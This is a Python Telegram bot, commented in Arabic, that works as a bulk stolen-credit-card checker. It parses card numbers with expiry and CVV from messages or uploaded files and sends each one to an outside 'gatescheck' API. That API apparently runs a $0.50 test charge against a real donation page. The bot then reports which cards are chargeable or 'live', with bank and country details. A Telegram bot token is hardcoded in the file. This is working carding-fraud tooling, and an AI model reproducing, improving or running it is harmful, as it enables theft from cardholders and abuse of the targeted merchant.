import os
import re
import time
import asyncio
import httpx
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = '8610138136:AAHHtP1A21F3NdW6hcQHocpgkcd-GF2EE_U'
API_URL = "http://gatescheck.duckdns.org:7000/check"

stop_users = {}
panel_messages = {}  # لتخزين رسالة اللوحة لكل مستخدم

# ------------------- BIN Lookup -------------------
async def get_bin_info(bin_number):
    url = f"https://lookup.binlist.net/{bin_number}"
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            r = await client.get(url)
            data = r.json()
        brand = data.get("scheme", "N/A")
        card_type = data.get("type", "N/A")
        bank = data.get("bank", {}).get("name", "N/A")
        country = data.get("country", {}).get("name", "N/A")
        return f"{brand} - {card_type}", bank, country
    except Exception:
        return "N/A", "N/A", "N/A"

# ------------------- Check API -------------------
async def check_card_api(card_full):
    params = {
        "url": "https://raybensch.com/donations/support-ray/",
        "card": card_full,
        "amount": 0.50
    }
    try:
        async with httpx.AsyncClient(timeout=15) as client:
            r = await client.get(API_URL, params=params)
            result_raw = r.json().get('result', '')
            result = result_raw.lower()

        if "charge" in result or "success" in result:
            return "approved", "Charge"
        elif "insufficient" in result:
            return "live", "Insufficient Funds"
        else:
            return "declined", result_raw
    except Exception as e:
        return "declined", f"Error: {str(e)}"

# ------------------- Format Response -------------------
async def format_response(card_full, status, response, taken):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    title = "💎 #Charge ✅" if status == "approved" else "🟢 #Live"
    return f"""{title}

💳 Card: {card_full}
📨 Response: {response}

🏦 Info: {info}
🏛 Bank: {bank}
🌍 Country: {country}

⏱ Time: {taken}s
"""

# ------------------- /pp لكل مستخدم -------------------
async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = False

    card_full = " ".join(context.args)
    if not card_full:
        await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
        return

    start_time = time.time()
    status, response = await check_card_api(card_full)
    taken = round(time.time() - start_time, 2)

    if status in ["approved", "live"]:
        text = await format_response(card_full, status, response, taken)
        await update.message.reply_text(text)
    else:
        await update.message.reply_text("❌ Declined")

# ------------------- /stop لكل مستخدم -------------------
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = True
    await update.message.reply_text("⛔ Stopped")

# ------------------- لوحة متابعة احترافية لكل مستخدم -------------------
async def update_panel(user_id, approved, live, declined, last_card, last_response, last_status):
    panel = f"""📊 <b>Status Panel</b>

✅ Charge: {approved}
🟢 Live: {live}
❌ Declined: {declined}
📂 Total: {approved + live + declined}

━━━━━━━━━━━━━━━
💳 Last Card: {last_card}
📨 Response: {last_response}
📌 Status: {last_status}
━━━━━━━━━━━━━━━

⛔ Stop: {'ON' if stop_users.get(user_id) else 'OFF'}
"""
    try:
        if user_id in panel_messages:
            await panel_messages[user_id].edit_text(panel, parse_mode='HTML')
        else:
            # إنشاء الرسالة لأول مرة
            msg = await panel_messages[user_id].reply_text(panel, parse_mode='HTML')
            panel_messages[user_id] = msg
    except:
        pass

# ------------------- File Handler لكل مستخدم -------------------
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = False

    if not os.path.exists('downloads'):
        os.makedirs('downloads')

    file = await update.message.document.get_file()
    file_path = f"downloads/{file.file_id}.txt"
    await file.download_to_drive(file_path)

    approved = live = declined = 0
    last_card = last_response = last_status = ""

    # إنشاء رسالة اللوحة للمستخدم
    panel_msg = await update.message.reply_text("🚀 Starting Check...")
    panel_messages[user_id] = panel_msg

    # تشغيل كل بطاقة كـ task متوازي
    async def process_card(card_full):
        nonlocal approved, live, declined, last_card, last_response, last_status
        if stop_users.get(user_id):
            return
        start_time = time.time()
        status, response = await check_card_api(card_full)
        taken = round(time.time() - start_time, 2)
        last_card = card_full
        last_response = response
        last_status = "💎 Charge ✅" if status=="approved" else "🟢 Live" if status=="live" else "❌ Declined"

        if status == "approved":
            approved += 1
        elif status == "live":
            live += 1
        else:
            declined += 1

        if status in ["approved","live"]:
            text = await format_response(card_full, status, response, taken)
            await update.message.reply_text(text)

        await update_panel(user_id, approved, live, declined, last_card, last_response, last_status)

    tasks = []
    with open(file_path, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if match:
                card_full = match[0]
                tasks.append(asyncio.create_task(process_card(card_full)))

    # انتظار انتهاء كل المهام
    await asyncio.gather(*tasks)
    stop_users[user_id] = False
    await update.message.reply_text("✅ Done!")

# ------------------- Start -------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 Bot Ready ✅\nUse /pp or upload a file to start.")

# ------------------- Run -------------------
def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.run_polling()

if __name__ == "__main__":
    main()
